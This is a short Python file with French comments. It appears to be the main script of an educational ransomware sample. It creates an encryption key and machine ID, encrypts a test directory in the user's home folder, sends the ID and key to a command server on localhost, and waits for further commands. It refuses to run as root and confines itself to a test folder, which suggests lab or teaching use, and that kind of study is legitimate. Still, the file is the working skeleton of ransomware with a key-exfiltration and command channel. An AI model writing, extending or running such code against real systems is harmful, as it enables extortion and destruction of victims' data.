import os
import sys
from utils import generate_key, get_machine_uuid
from encryption import encrypt_directory
from communication import send_initial_data, listen_for_commands

# 🔒 Interdiction d'exécuter en tant que root
if os.geteuid() == 0:
    print("[!] Refus d'exécution en tant que root.")
    sys.exit(1)

def main():
    # 🔐 Génération UUID + clé
    key = generate_key()
    uuid = get_machine_uuid()

    # 📁 Répertoire de test sécurisé
    TARGET_DIR = os.path.join(os.environ["HOME"], "ransom_test")

    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        with open(os.path.join(TARGET_DIR, "test.txt"), "w") as f:
            f.write("Ceci est un fichier de test.\n")

    print(f"[i] Chiffrement de : {TARGET_DIR}")
    encrypt_directory(TARGET_DIR, key)

    # 🌐 Communication avec le serveur
    send_initial_data("127.0.0.1", 9001, uuid, key)
    listen_for_commands("127.0.0.1", 9002)

if __name__ == "__main__":
    main()

